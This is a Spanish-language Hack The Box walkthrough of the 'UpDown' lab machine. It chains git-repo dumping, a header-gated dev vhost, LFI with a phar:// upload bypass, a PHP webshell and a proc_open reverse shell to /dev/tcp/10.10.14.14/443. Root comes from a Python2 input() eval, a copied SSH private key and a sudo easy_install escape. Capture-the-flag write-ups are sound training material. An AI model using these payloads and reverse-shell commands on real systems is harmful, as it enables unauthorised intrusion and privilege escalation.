---
layout: single
title: UpDown - Hack The Box
excerpt: "Tocamos vulnerabilidades web, entre ellas una manera de bypass de subida de archivos con el wrapper phar"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-awkward/awkward1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - LFI
  - File-Upload
  - Git
  - Python2  
---

# 10.10.11.177 - Updown

![](/assets/images/htb-updown/updown1.png)

-----------------------
# Part 1: Enumeracion y fuzzing

Puertos abiertos 22(ssh) y 80(http)
```console
└─$ whatweb http://10.10.11.177
Apache[2.4.41] HTML5
```
La web nos muestra una utilidad para ver si funcionan servidores, junto al titulo siteisup.htb (meterlo en el /etc/hosts)
![](/assets/images/htb-updown/updown2.PNG)

Como las maquinas de htb no tienen salida a internet, no podemos probar con el ejemplo de google.com:
```
- http://localhost:80 -> da como valido, asi que podemos tener un SSRF.   
- http://localhost:22 -> sabemos que este puerto ssh esta abierto pero no nos dice nada.   
- http://10.10.14.14 -> nuestro servidor (abierto asi ```sudo nc -nlvp 80```) nos llega una peticion /GET.  
```
Si empezamos con fuzzing:
```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://siteisup.htb/FUZZ/
000000820:   200        0 L      0 W        0 Ch        "dev"
000000069:   403        9 L      28 W       277 Ch      "icons"
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://siteisup.htb/dev/FUZZ/
# Mi diccionario está modificado, añadiendole manualmente .git y .htacess que son muy comunes.
000000010:   200        26 L     172 W      2884 Ch     ".git"
000000011:   403        9 L      28 W       277 Ch      ".htacess"
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://siteisup.htb/FUZZ.php
000000011:   403        9 L      28 W       277 Ch      ".htacess"
000000001:   200        39 L     93 W       1131 Ch     "index"
└─$ wfuzz -c --hl=39 -w $(locate bitquark-subdomains-top100000.txt) -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb/ -t 100 
000000022:   403        9 L      28 W       281 Ch      "dev"
```
-----------------------
# Part 2: Git repo

Como tenemos un .git lo sacaremos con git-dumper
```console
└─$ git-dumper http://siteisup.htb/dev/.git/ git
```
Este repo de git aplica al subdominio "dev.siteisup" no al original:
- changelog.txt -> "To-Do -> eliminar la opcion upload" vulnerable? 
Tabmien están *index.php* y *Checker.php*  

Si hacemos un git-log encontramos esta branch...
```console
└─$ git log --oneline 
010dcc3 (HEAD -> main, origin/main, origin/HEAD) Delete index.php
57af03b Create index.php
354fe06 Delete .htpasswd
8812785 New technique in header to protect our dev vhost.
bc4ba79 Update .htaccess

└─$ git diff 57af03b 354fe06  # Eliminado htpasswd -> vacio
└─$ git diff bc4ba79 8812785  # htacess actualizado
diff --git a/.htaccess b/.htaccess
 SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
```

Esto lo que quiere decir esque /dev tiene que tener la cabecera "Special-Dev: only4dev" para que te de acceso.  
Una vez puesta esta cabecera con la extension "simply modify headers" ya nos aparece una web similar a la anterior.  
![](/assets/images/htb-updown/updown3.PNG)
![](/assets/images/htb-updown/updown4.PNG)

------------------------------------------------
# Part 3: LFI -> Page?admin

El codigo del repo que nos hemos bajado y que concierne a esta parte:
```php
<b>This is only for developers</b>
<a href="?page=admin">Admin Panel</a>
<?php
    define("DIRECTACCESS",false);	
    $page=$_GET['page'];			// El contenido de la maquina que le pidamos por get a page
    if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){ 	// Mientras que no incluya estos patrones
        include($_GET['page'] . ".php");		// Le concatenará la extensión.php y nos lo mostrará
 }else{ 
	include("checker.php");};
	// Si no ponemos ?page=admin nos carga checker.php
?>
```
Por tanto si la url es: http://dev.siteisup.htb/?page=admin -> (mensaje simple "This is only for developers")
Intentamos un LFI ya sabemos por el codigo de arriba que:
- No podemos pedir nada que tenga -> /bin, usr, home, var, etc, i   
- A lo que pidamos le pondra la extension php  
- Si pedimos un php habra que poner el wrapper de codificacion en base64 porque si no lo interpreta.  
- 
```console
└─$ curl -s -H "Special-Dev: only4dev" http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=checker | tail -n 1
PD9waHAKaWYoRElSRUNUQUNDRVNTKXsKCWRpZSgiQWNjZXNzIERlbmllZCIpOwp9Cj8+CjwhRE9DVFlQR...
```
El tema esque esos archivos php ya los tenemos gracias al repo asi que no es muy util por ahora.

------------------------------------------------
# Part 4: File upload phar

De no poner la url con el "page?" el codigo que entra en juego es **checker.php**
```php
<?php
if($_POST['check']){
    // Comprueba que el archivo sea menor que 10kb
    if ($_FILES['file']['size'] > 10000) { die("File too large!");}

	// Comprueba que la extension no sea ninguna de estas...
    $file = $_FILES['file']['name'];  
    $ext = getExtension($file);
    if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
        die("Extension not allowed!");}
  
    // Crea un directorio para meter el archivo cargado. -> "/uploads/md5/"
    $dir = "uploads/".md5(time())."/";
    if(!is_dir($dir)){ mkdir($dir, 0770, true); }
  
    // Lo mete ahí y lo lee
    $final_path = $dir.$file;
    move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

	// Parece que cada linea del codigo la separa como una web (quiere una lista de webs)
    $websites = explode("\n",file_get_contents($final_path));
    foreach($websites as $site){
        $site=trim($site);
        if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
            $check=isitup($site);
            if($check){ echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
            }else{ echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";}   
        }else{ echo "<center><font color='red'>Hacking attempt was detected !</font></center>";}}
    
  // Lo borra
    @unlink($final_path);}
?>
```
Si subo una lista de webs como me piden (webs.txt):
```
http://localhost:80  
http://10.10.14.14  
http://10.10.14.14/test.txt  
```
Me llegan peticiones al igual que la web original:  
- Si cambio a webs.php -> extension not allowed  
- En /uploads/ encuentro un archivo md5 pero esta vacio.   
- Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se sube pero obviamente no se ejecuta. 

Queda tirar de la vulnerabilidad "phar"
```console  
└─$ zip shell.jpeg shell.php   # shell php -> <?php system($_GET[‘cmd’]); ?> 
└─$ file shell.jpeg    # shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zip.
```
En /uploads aparece un nuevo directorio, ahi dentro está shell.jpeg  
![](/assets/images/htb-updown/updown5.PNG)

Si accedemos con el wrapper phar:// con el LFI al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)  
> phar://ruta_del_archivo_madre(shell.jpeg)/archivo_hijo(shell)/     
```console
└─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/1526e941f20f74050a82951a5bda79e2/shell.jpeg/shell' -I
HTTP/1.0 500 Internal Server Error
```
El error 500 se debe a que hay una funcion prohibida.  
Si cambiamos el contenido de shell.php a  ```<?php phpinfo(); ?>"``` y  repetimos el proceso tenemos el documento en la web:  

Si copiamos las disabled functions las metemos en el archivo "disabled_functions" y con vim sustituimos las , por retorno de  carro -> ```:%s/,/\r/g```
Acabamos con una lista bien clara de las funciones prohibidas entre las que estan system, exec o shell_exec entre todas.  

![](/assets/images/htb-updown/updown6.PNG)

Esta es una lista de las funciones que nos permiten ejecutar comandos (lo metemos en un archivo llamado dangerous)
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,ld,mail
```
Si les hacemos el mismo formateo que el otro archivo (quitando las ",")

```
└─$ diff <(cat dangerous) <(cat disabled_function)
# < proc_open es la unica que les ha faltado quitar
```

Nunca he usado esta funcion, en la web de [php](https://www.php.net/manual/en/function.proc-open.php)
```php
<?php
$cmd="bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'";
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w") // stderr is a pipe that the child will write to
);
$process = proc_open($cmd, $descriptorspec, $pipes);
?>
```
```console
└─$ zip shell.jpeg proc_open.php
```
Se sube
```
└─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/11b42026fc92308ec770427677734fa7/shell.jpeg/proc_open'
└─$ sudo nc -nlvp 443
www-data@updown:/var/www/dev$ 
```
------------------------------------------------
# Part 5: Explotando python2

- SUIDs -> /home/developer/dev/siteisup
```console
www-data@updown:/tmp$ strings /home/developer/dev/siteisup
/usr/bin/python /home/developer/dev/siteisup_test.py
```
En el directorio home de developer estan estos dos archivos, tanto el binario siteisup como el test.py
```python
www-data@updown:/tmp$ cat /home/developer/dev/siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```
Es un python2 porque al print no lo pone entre parentesis sino con un espacio.
```console
www-data@updown:/home/developer/dev$ ./siteisup         
Welcome to 'siteisup.htb' application
Enter URL here:__import__('os').system("bash")
developer@updown:/home/developer/dev$ 
```
Esta vulnerabilidad se acontece porque python2 cuando ejecuta input, le pasa su contenido a la funcion eval() que sirve
para ejecutar codigo.
Seguimos sin poder leer la user flag, asi que nos metemos al directorio .ssh de developer y copiamos la id_rsa
```console
developer@updown:/home/developer/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05...
└─$ vim id_rsa
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa developer@10.10.11.177   
developer@updown:~$ 
```
------------------------------------------------
# Part 6: Gtfobins

Nuestro usuario tiene como sudoers -> (ALL) NOPASSWD: /usr/local/bin/easy_install
En [gtfobins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) nos dicen como explotar esto:

```console
developer@updown:$ TF=$(mktemp -d)
developer@updown:$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:$ sudo easy_install $TF
```
